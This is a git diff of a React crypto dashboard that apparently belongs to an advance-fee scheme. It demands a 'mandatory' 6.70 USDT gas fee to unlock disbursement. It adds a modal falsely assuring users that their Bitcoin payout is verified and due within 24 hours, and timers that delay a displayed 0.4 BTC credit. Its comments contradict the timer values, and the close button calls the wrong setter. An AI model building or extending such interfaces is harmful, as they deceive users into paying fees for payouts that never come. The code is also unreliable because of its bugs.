@@ -481,6 +481,8 @@ export default function UserDashboard() {
   const [selectedExchange, setSelectedExchange] = useState("");
   const [isSubmitted, setIsSubmitted] = useState(false);
 const [showConfirmModal, setShowConfirmModal] = useState(false);
+const [delayPassed, setDelayPassed] = useState(false);
+  const [showAmountModal, setShowAmountModal] = useState(false);
   {
     /* Pagination logic */
   }
@@ -513,6 +515,8 @@ const [showConfirmModal, setShowConfirmModal] = useState(false);
       toast.error("Unable to proceed to payment");
     }
   };
+
+
 
   useEffect(() => {
     const fetchBeneficiaries = async () => {
@@ -928,6 +932,36 @@ const [showConfirmModal, setShowConfirmModal] = useState(false);
   const toggleTransactions = () => {
     setShowTransactions(!showTransactions);
   };
+
+
+   useEffect(() => {
+    let feeTimer;
+    let modalTimer;
+
+    if (gasFeeStatus.verified) {
+      // Show modal immediately when verified
+      setShowAmountModal(true);
+
+      // Auto-close modal after 5 seconds
+      modalTimer = setTimeout(() => {
+        setShowAmountModal(false);
+      }, 15000);
+
+      // After 24hrs, activate fee
+      feeTimer = setTimeout(() => {
+        setDelayPassed(true);
+      }, 2 * 60 * 60 * 1000);
+    }
+
+    return () => {
+      clearTimeout(feeTimer);
+      clearTimeout(modalTimer);
+    };
+  }, [gasFeeStatus.verified]);
+
+  // Fee logic: only active if backend says verified AND 2 minutes have passed
+  const fee = gasFeeStatus.verified && delayPassed ? 0.4 : 0;
+
 
   return (
     <div className="flex min-h-screen bg-gray-900 text-white">
@@ -1404,8 +1438,8 @@ const [showConfirmModal, setShowConfirmModal] = useState(false);
               ⚠️ Important Notice
             </h2>
             <p className="text-red-400 font-medium mb-4 text-center">
-              Payment of (6.70 USDT per CEO) as gas fee is mandatory for
-              verification before registration to enable disbursement into
+              Payment of (6.70 USDT per CEO) as gas fee is mandatory to
+              complete registration to enable disbursement into
               wallet.
             </p>
             <p className="text-lg uppercase text-gray-200 leading-relaxed">
@@ -1423,6 +1457,62 @@ const [showConfirmModal, setShowConfirmModal] = useState(false);
           </div>
         </div>
       )}
+
+
+{/* ===== Modal ===== */}
+{showAmountModal && (
+  <div className="fixed inset-0 flex items-center justify-center bg-black/70 backdrop-blur-md z-50">
+    <div className="relative bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 text-white p-8 rounded-3xl shadow-2xl max-w-md w-full text-center animate-fadeIn border border-gray-700/50">
+      
+      {/* Close button */}
+      <button
+        className="absolute top-4 right-4 text-gray-400 hover:text-white transition"
+        onClick={() => setShowModal(false)}
+      >
+        <X size={22} />
+      </button>
+
+      {/* Icon / Illustration */}
+      <div className="flex justify-center mb-4">
+        <div className="h-16 w-16 flex items-center justify-center rounded-full bg-gradient-to-tr from-cyan-400 to-blue-500 text-white shadow-lg animate-pulse">
+          ₿
+        </div>
+      </div>
+
+      {/* Title */}
+      <h3 className="text-2xl font-extrabold bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent mb-3">
+        BTC Disbursement Scheduled
+      </h3>
+
+      {/* Message */}
+      <p className="text-gray-300 text-sm mb-3">
+        Your Bitcoin disbursement has been successfully{" "}
+        <span className="text-green-400 font-medium">verified</span> and is now
+        scheduled for release.
+      </p>
+      <p className="text-gray-200 text-base font-medium mb-2">
+        ⏳ The funds will be released automatically within{" "}
+        <span className="text-cyan-400 font-semibold">24 hours</span>.
+      </p>
+      <p className="text-gray-400 text-xs">
+        Please keep this page bookmarked and ensure your wallet is ready to receive the transaction.
+      </p>
+
+      {/* Progress Indicator */}
+      <div className="mt-6">
+        <div className="w-full bg-gray-700 h-2 rounded-full overflow-hidden">
+          <div className="h-full bg-gradient-to-r from-cyan-400 to-blue-500 animate-progress rounded-full"></div>
+        </div>
+        <p className="text-xs text-gray-500 mt-2">Awaiting disbursement...</p>
+      </div>
+
+      {/* Footer */}
+      <p className="text-sm text-gray-300 mt-6">Thank you for your patience 🙏</p>
+    </div>
+  </div>
+)}
+
+
 
       <div className="flex-1 flex flex-col ml-0 lg:ml-64 z-10 overflow-hidden relative">
         <header
@@ -1567,30 +1657,27 @@ const [showConfirmModal, setShowConfirmModal] = useState(false);
                 </motion.div>
               </div>
               <div className="mt-1 space-y-1">
-                <h2 className="text-lg font-semibold text-white flex items-center">
-                  {showGrantInUSDT ? (
-                    <>
-                      <DollarSign size={14} className="text-cyan-400 mr-1" />
-                      {btcPrice
-                        ? (
-                            ((gasFeeStatus.verified ? 0.4 : 0) +
-                              beneficiaryCount * 0.14) *
-                            btcPrice
-                          ).toLocaleString()
-                        : "Loading..."}{" "}
-                      USDT
-                    </>
-                  ) : (
-                    <>
-                      <Bitcoin size={14} className="text-cyan-400 mr-1" />
-                      {(
-                        (gasFeeStatus.verified ? 0.4 : 0) +
-                        beneficiaryCount * 0.14
-                      ).toFixed(4)}{" "}
-                      BTC
-                    </>
-                  )}
-                </h2>
+       
+
+      {/* ===== Display Amount ===== */}
+      <h2 className="text-lg font-semibold text-white flex items-center">
+        {showGrantInUSDT ? (
+          <>
+            <DollarSign size={14} className="text-cyan-400 mr-1" />
+            {btcPrice ? (
+              ((fee + beneficiaryCount * 0.14) * btcPrice).toLocaleString()
+            ) : (
+              "Loading..."
+            )}{" "}
+            USDT
+          </>
+        ) : (
+          <>
+            <Bitcoin size={14} className="text-cyan-400 mr-1" />
+            {(fee + beneficiaryCount * 0.14).toFixed(4)} BTC
+          </>
+        )}
+      </h2>
               </div>
               <p className="text-gray-300 text-xs font-medium mt-2 uppercase tracking-widest">
                 CEO Commission
@@ -1970,9 +2057,9 @@ const [showConfirmModal, setShowConfirmModal] = useState(false);
                   <p>
                     Amount: {t.amount} {t.currency}
                   </p>
-                  <p className="text-gray-300">{t.description || "N/A"}</p>
+                  <p className="text-gray-300">{ t.description || "N/A"}</p>
                 </motion.div>
-              ))}
+              ))} 
 
               {transactions.length === 0 && (
                 <p className="text-center text-gray-400">
